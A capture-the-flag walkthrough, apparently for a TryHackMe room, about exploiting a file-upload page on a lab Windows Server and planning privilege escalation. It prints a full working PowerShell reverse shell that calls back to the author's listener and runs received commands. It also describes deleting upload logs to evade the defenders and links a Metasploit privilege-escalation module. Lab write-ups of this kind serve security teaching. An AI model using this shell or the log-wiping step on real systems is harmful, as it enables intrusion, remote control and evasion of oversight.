Begin by initiating the virtual machine; click on the "Start Machine" button located in the top right corner of the task. Then, access the machine by navigating to 10.10.34.210:8080. This challenge can be tackled either through a VPN connection or by using the AttackBox, which is equipped with all necessary tools.

Bypassing the nmap scan, I directly explored port 8080 and was presented with a webpage that featured file upload functionality.

I set up a Netcat listener on port 9001 and proceeded to craft a PowerShell (ps1) reverse shell payload, which I then uploaded.

Hereâ€™s how I created the ps1 reverse shell:

powershell
Copy code
$LHOST = "10.6.9.14"; $LPORT = 9001; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); 
$NetworkStream = $TCPClient.GetStream(); 
$StreamReader = New-Object IO.StreamReader($NetworkStream); 
$StreamWriter = New-Object IO.StreamWriter($NetworkStream); 
$StreamWriter.AutoFlush = $true; 
$Buffer = New-Object System.Byte[] 1024; 
while ($TCPClient.Connected) { 
    while ($NetworkStream.DataAvailable) { 
        $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); 
        $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) 
    }; 
    if ($TCPClient.Connected -and $Code.Length -gt 1) { 
        $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; 
        $StreamWriter.Write("$Output`n"); 
        $Code = $null 
    } 
}; 
$TCPClient.Close(); 
$NetworkStream.Close(); 
$StreamReader.Close(); 
$StreamWriter.Close()
Successfully, this granted me a low-level shell access.

While exploring the file system, I discovered a URL: http://10.10.34.210:8000/asdasdadasdjakjdnsdfsdfs.php.

It seems that the Blue team was alerted. A hint suggested that I should delete the file upload logs to access the page. The log files were located at C:\xampp\htdocs\uploads.

After removing all the logs, I successfully retrieved the first flag:

THM{****************}

Manual Windows Priv: https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/

We can't run winpeas so we need to either create a ps1 script to upload or use one in the wild: https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1

systeminfo:

System Information Summary:
Host Name: HOSTEVASION
OS: Windows Server 2019 Datacenter, Version 10.0.17763 Build 17763
Install Date: 3/17/2021
System Uptime: Since 11/30/2023
Hardware: Xen HVM domU, x64-based PC
Processor: Intel64 Family 6 Model 63 Stepping 2, ~2400 Mhz
BIOS Version: Xen 4.11.amazon (Dated 8/24/2006)
Memory: 4,096 MB total, 2,787 MB available
Virtual Memory: 4,800 MB max size, 3,401 MB available
Network Interface: AWS PV Network Device, IP 10.10.34.210
DHCP Server: 10.10.0.1
Domain: WORKGROUP
Hotfixes: Information not available
Hyper-V: Hypervisor detected

https://www.exploit-db.com/exploits/47128

metasploit: 0  exploit/windows/local/appxsvc_hard_link_privesc 

https://www.infosecmatter.com/metasploit-module-library/?mm=exploit/windows/local/appxsvc_hard_link_privesc

https://www.puckiestyle.nl/meterpreter-reverse-shell-with-powershell/


